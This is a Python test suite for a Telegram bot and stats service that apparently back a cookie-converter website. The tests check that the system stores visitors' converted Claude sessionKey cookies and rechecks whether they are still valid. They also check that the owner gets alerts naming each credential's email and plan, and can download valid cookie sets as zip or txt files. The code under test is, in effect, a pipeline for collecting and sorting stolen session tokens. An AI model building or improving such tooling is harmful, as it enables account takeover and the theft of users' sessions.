#!/usr/bin/env python3
"""Bot views, zip builder, and push filters. Does not talk to Telegram."""

import io
import json
import os
import sqlite3
import tempfile
import zipfile
import unittest
from datetime import datetime, timezone
from pathlib import Path


class TgbotTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        os.environ["CC_STATS_DB"] = os.path.join(self.tmp.name, "stats.db")
        os.environ["CC_STATS_CONF"] = os.path.join(self.tmp.name, "bot.conf")
        os.environ["CC_BOX_KEY"] = os.path.join(self.tmp.name, "box.key")
        Path(os.environ["CC_STATS_CONF"]).write_text(
            json.dumps({"bot_token": "x", "owner_id": 1}), encoding="utf-8"
        )
        import importlib

        import stats_service
        import tgbot
        self.svc = importlib.reload(stats_service)
        self.svc.DB_PATH = os.environ["CC_STATS_DB"]
        self.svc.reset_box_cache()
        self.svc.init_db()
        self.bot = importlib.reload(tgbot)
        self.bot.DB_PATH = os.environ["CC_STATS_DB"]

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def _conn(self):
        conn = sqlite3.connect(self.bot.DB_PATH)
        conn.row_factory = sqlite3.Row
        return conn

    def _event(self, conn, type_, **kw):
        row = {
            "ts": kw.get("ts", 1),
            "day": kw.get("day", datetime.now(timezone.utc).strftime("%Y-%m-%d")),
            "type": type_,
            "visitor": kw.get("visitor", "v1"),
            "country": kw.get("country", "DE"),
            "locale": kw.get("locale", "en"),
            "device": kw.get("device", "desktop"),
            "path": kw.get("path"),
            "from_fmt": kw.get("from_fmt"),
            "to_fmt": kw.get("to_fmt"),
            "n": kw.get("n", 1),
            "domains": kw.get("domains"),
            "valid": kw.get("valid"),
            "reason": kw.get("reason"),
            "info": kw.get("info"),
        }
        return self.svc.insert_event(conn, row, kw.get("output"))

    def test_overview_includes_today_checks(self) -> None:
        conn = self._conn()
        self._event(conn, "convert", n=4, output="a")
        self._event(conn, "check", valid=1, info=json.dumps({"plan": "Pro"}), output="b")
        self._event(conn, "check", valid=0, reason="expired", output="c")
        conn.commit()
        text = self.bot.view_overview(conn)
        conn.close()
        self.assertIn("сегодня 1", text)
        self.assertIn("Проверок Claude", text)
        self.assertIn("всего ✅ 1", text)

    def test_geography_uses_unique_visitors(self) -> None:
        conn = self._conn()
        self._event(conn, "pageview", visitor="a", country="DE", locale="en")
        self._event(conn, "convert", visitor="a", country="DE", locale="en", output="x")
        self._event(conn, "pageview", visitor="b", country="US", locale="ru")
        self._event(conn, "pageview", visitor="c", country=None, locale=None)
        conn.commit()
        text = self.bot.view_countries(conn)
        conn.close()
        self.assertIn("DE", text)
        self.assertIn("не определено", text)
        self.assertIn("уникальные посетители", text)
        self.assertIn("Русский", text)

    def test_settings_split_valid_invalid(self) -> None:
        conn = self._conn()
        txt, kb = self.bot.view_settings(conn)
        conn.close()
        data = {btn["callback_data"] for row in kb for btn in row}
        self.assertIn("set:push_check_valid", data)
        self.assertIn("set:push_check_invalid", data)
        self.assertIn("set:push_credential", data)
        self.assertIn("валидных", txt)
        self.assertIn("credential", txt.lower())

    def test_push_credential_has_no_tokens(self) -> None:
        conn = self._conn()
        info = json.dumps({"email": "ada@example.com", "plan": "Claude Pro"})
        eid = self._event(conn, "credential", valid=1, info=info)
        self.bot.set_state(conn, "last_push_credential_id", eid - 1)
        conn.commit()
        sent = []
        original = self.bot.send
        self.bot.send = lambda *args, **kwargs: sent.append(args[1] if len(args) > 1 else args)
        try:
            self.bot._push_kind(
                conn,
                "credential",
                "push_credential",
                "last_push_credential_id",
                self.bot._push_credential,
            )
        finally:
            self.bot.send = original
        conn.close()
        self.assertEqual(len(sent), 1)
        text = sent[0]
        self.assertIn("Новый credential", text)
        self.assertIn("ada@example.com", text)
        self.assertNotIn("sk-ant-oat", text)
        self.assertNotIn("sk-ant-ort", text)
        self.assertNotIn("sessionKey", text)

    def test_should_push_check(self) -> None:
        settings = {"push_check_valid": "1", "push_check_invalid": "0"}
        get = lambda k, d="1": settings.get(k, d)
        self.assertTrue(self.bot.should_push_check(1, get))
        self.assertFalse(self.bot.should_push_check(0, get))

    def test_should_push_convert_skips_site_sample(self) -> None:
        sample = "session_id\t8f14e45fceea167a5a36dedd4bea2543\ncart_preview\ttmp-4471"
        self.assertFalse(self.bot.should_push_convert(sample))
        self.assertTrue(self.bot.should_push_convert("sessionKey=sk-ant-REAL; host=example.com"))
        self.assertTrue(self.bot.should_push_convert(None))

    def test_push_kind_skips_sample_and_advances_marker(self) -> None:
        conn = self._conn()
        eid = self._event(
            conn,
            "convert",
            domains="example.com",
            output="session_id\t8f14e45fceea167a5a36dedd4bea2543\ncart_preview\ttmp-4471",
        )
        self.bot.set_state(conn, "last_push_convert_id", eid - 1)
        conn.commit()
        sent = []
        original = self.bot.send
        self.bot.send = lambda *args, **kwargs: sent.append(args)
        try:
            self.bot._push_kind(
                conn, "convert", "push_convert", "last_push_convert_id", self.bot._push_conversion
            )
        finally:
            self.bot.send = original
        last = int(
            conn.execute(
                "SELECT value FROM botstate WHERE key='last_push_convert_id'"
            ).fetchone()[0]
        )
        conn.close()
        self.assertEqual(sent, [])
        self.assertEqual(last, eid)

    def test_zip_from_blobs(self) -> None:
        conn = self._conn()
        self._event(conn, "convert", to_fmt="header", output="one", ts=2_000_000_000)
        self._event(conn, "convert", to_fmt="header", output="two", ts=2_000_000_001)
        conn.commit()
        rows = conn.execute(
            "SELECT e.id, e.ts, e.to_fmt, b.output FROM events e "
            "JOIN blobs b ON b.event_id=e.id ORDER BY e.id"
        )
        path, n = self.bot.build_zip_file(rows, lambda r: f"{r['id']}.txt")
        conn.close()
        self.assertEqual(n, 2)
        with zipfile.ZipFile(path) as z:
            names = z.namelist()
            self.assertEqual(len(names), 2)
            self.assertEqual(z.read(names[0]).decode(), "one")
        os.unlink(path)

    def test_cookies_screen_has_two_downloads(self) -> None:
        conn = self._conn()
        txt, kb = self.bot.view_cookies(conn)
        conn.close()
        data = [btn["callback_data"] for row in kb for btn in row]
        self.assertEqual(data, ["ck:valid", "ck:all", "ck:recheck", "home"])
        self.assertIn("Валидные", txt)
        self.assertIn("Все", txt)

    def _capture_docs(self):
        sent = []

        def fake_send_document(chat_id, filename, content, caption=""):
            sent.append({"name": filename, "content": content, "caption": caption})
            return {"ok": True}

        self.bot.send_document = fake_send_document
        self.bot.send = lambda *a, **k: None
        return sent

    def test_check_zip_name_uses_email_and_plan(self) -> None:
        conn = self._conn()
        info = json.dumps({"email": "Andreas@example.com", "plan": "Claude Max"})
        self._event(conn, "check", valid=1, info=info, output="sessionKey=sk-ant-OK")
        conn.commit()
        sent = self._capture_docs()
        toast = self.bot.download_pipeline(conn, 1, "valid", "zip")
        conn.close()
        self.assertTrue(toast.startswith("Отправлено"))
        with zipfile.ZipFile(io.BytesIO(sent[0]["content"])) as z:
            self.assertEqual(z.namelist(), ["andreas-max-valid.txt"])

    def test_download_valid_skips_invalid_and_unchecked(self) -> None:
        conn = self._conn()
        self._event(conn, "check", valid=1, output="sessionKey=sk-ant-OK")
        self._event(conn, "check", valid=0, reason="expired", output="sessionKey=sk-ant-BAD")
        self._event(conn, "convert", valid=None, output="sessionKey=sk-ant-OLD")
        conn.commit()
        sent = self._capture_docs()
        toast = self.bot.download_pipeline(conn, 1, "valid", "zip")
        conn.close()
        self.assertTrue(toast.startswith("Отправлено"))
        self.assertEqual(len(sent), 1)
        with zipfile.ZipFile(io.BytesIO(sent[0]["content"])) as z:
            names = z.namelist()
            self.assertEqual(len(names), 1)
            self.assertEqual(z.read(names[0]).decode(), "sessionKey=sk-ant-OK")

    def test_download_all_includes_both_types(self) -> None:
        conn = self._conn()
        self._event(conn, "convert", valid=None, output="from-convert")
        self._event(conn, "check", valid=0, output="from-check")
        conn.commit()
        sent = self._capture_docs()
        toast = self.bot.download_pipeline(conn, 1, "all", "zip")
        conn.close()
        self.assertTrue(toast.startswith("Отправлено"))
        with zipfile.ZipFile(io.BytesIO(sent[0]["content"])) as z:
            self.assertEqual(len(z.namelist()), 2)

    def test_download_txt_one_line_per_set(self) -> None:
        netscape = (
            "# Netscape HTTP Cookie File\n"
            ".claude.ai\tTRUE\t/\tTRUE\t0\tsessionKey\tsk-ant-LINE\n"
            ".claude.ai\tTRUE\t/\tTRUE\t0\tlastActiveOrg\torg-1\n"
        )
        conn = self._conn()
        self._event(conn, "check", valid=1, output=netscape)
        self._event(conn, "convert", valid=1, output="sessionKey=sk-ant-HDR; lastActiveOrg=org-2")
        conn.commit()
        sent = self._capture_docs()
        toast = self.bot.download_pipeline(conn, 1, "valid", "txt")
        conn.close()
        self.assertTrue(toast.startswith("Отправлено"))
        text = sent[0]["content"].decode()
        lines = [ln for ln in text.split("\n") if ln]
        self.assertEqual(len(lines), 2)
        self.assertTrue(all("\n" not in ln for ln in lines))
        self.assertIn("sessionKey=sk-ant-LINE", lines[0])
        self.assertIn("sessionKey=sk-ant-HDR", lines[1])
        self.assertTrue(sent[0]["name"].endswith(".txt"))

    def test_recheck_updates_same_rows_without_new_events(self) -> None:
        conn = self._conn()
        self._event(conn, "convert", valid=None, output="sessionKey=sk-ant-A")
        self._event(conn, "check", valid=0, reason="expired", output="sessionKey=sk-ant-B")
        self._event(conn, "convert", valid=None, output="foo=bar")
        conn.commit()
        conn.close()
        calls = []

        def fake_exec(raw, session_id, country, *, force=False):
            calls.append((raw, force))
            ok = "sk-ant-A" in raw
            return (
                {
                    "ok": ok,
                    "invalidReason": None if ok else "expired",
                    "email": "a@b.c",
                    "name": "A",
                    "planLabel": "Pro",
                    "session": {},
                    "weekly": {},
                    "extras": {},
                },
                False,
            )

        self.bot.execute_check = fake_exec
        self.bot.egress_ok = lambda *a, **k: True
        stats = self.bot.recheck_all_stored()
        self.assertEqual(stats["total"], 3)
        self.assertEqual(stats["unique"], 2)
        self.assertEqual(stats["valid"], 1)
        self.assertEqual(stats["invalid"], 1)
        self.assertEqual(stats["skipped"], 1)
        self.assertEqual(len(calls), 2)
        self.assertTrue(all(force for _raw, force in calls))
        conn = self._conn()
        rows = conn.execute("SELECT type, valid FROM events ORDER BY id").fetchall()
        n = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
        conn.close()
        self.assertEqual(n, 3)
        self.assertEqual(rows[0]["valid"], 1)
        self.assertEqual(rows[1]["valid"], 0)
        self.assertIsNone(rows[2]["valid"])

    def test_recheck_same_session_once(self) -> None:
        conn = self._conn()
        self._event(conn, "convert", output="sessionKey=sk-ant-SAME")
        self._event(conn, "check", valid=0, output="sessionKey=sk-ant-SAME")
        conn.commit()
        conn.close()
        calls = {"n": 0}

        def fake_exec(raw, session_id, country, *, force=False):
            calls["n"] += 1
            return (
                {
                    "ok": True,
                    "email": "a@b.c",
                    "name": "A",
                    "planLabel": "Pro",
                    "session": {},
                    "weekly": {},
                    "extras": {},
                },
                False,
            )

        self.bot.execute_check = fake_exec
        self.bot.egress_ok = lambda *a, **k: True
        stats = self.bot.recheck_all_stored()
        self.assertEqual(calls["n"], 1)
        self.assertEqual(stats["valid"], 2)
        conn = self._conn()
        vals = [r[0] for r in conn.execute("SELECT valid FROM events ORDER BY id")]
        conn.close()
        self.assertEqual(vals, [1, 1])

    def test_recheck_summary_lists_counts(self) -> None:
        txt = self.bot._recheck_summary(
            {"total": 4, "unique": 2, "valid": 1, "invalid": 2, "skipped": 1}
        )
        self.assertIn("4", txt)
        self.assertIn("валидных", txt)
        self.assertIn("без sessionKey", txt)


class BotBatchTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        os.environ["CC_STATS_DB"] = os.path.join(self.tmp.name, "stats.db")
        os.environ["CC_STATS_CONF"] = os.path.join(self.tmp.name, "bot.conf")
        import importlib
        import tgbot
        self.bot = importlib.reload(tgbot)

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_looks_like_cookies(self) -> None:
        self.assertTrue(self.bot._looks_like_cookies("sessionKey=abc; lastActiveOrg=x"))
        self.assertTrue(self.bot._looks_like_cookies('[{"name":"sessionKey","value":"a"}]'))
        self.assertTrue(self.bot._looks_like_cookies(
            ".claude.ai\tTRUE\t/\tTRUE\t0\tsessionKey\tabc"))
        self.assertFalse(self.bot._looks_like_cookies("привет как дела"))
        self.assertFalse(self.bot._looks_like_cookies(""))

    def test_batch_summary_counts(self) -> None:
        results = [
            ("c1", {"ok": True, "planLabel": "Claude Max", "email": "a@b.c",
                    "session": {"percent": 40}, "weekly": {"percent": 70}}),
            ("c2", {"ok": False, "invalidReason": "expired"}),
        ]
        txt = self.bot._batch_summary(results)
        self.assertIn("2 шт", txt)
        self.assertIn("✅ 1", txt)
        self.assertIn("❌ 1", txt)
        self.assertIn("Claude Max", txt)


if __name__ == "__main__":
    unittest.main()
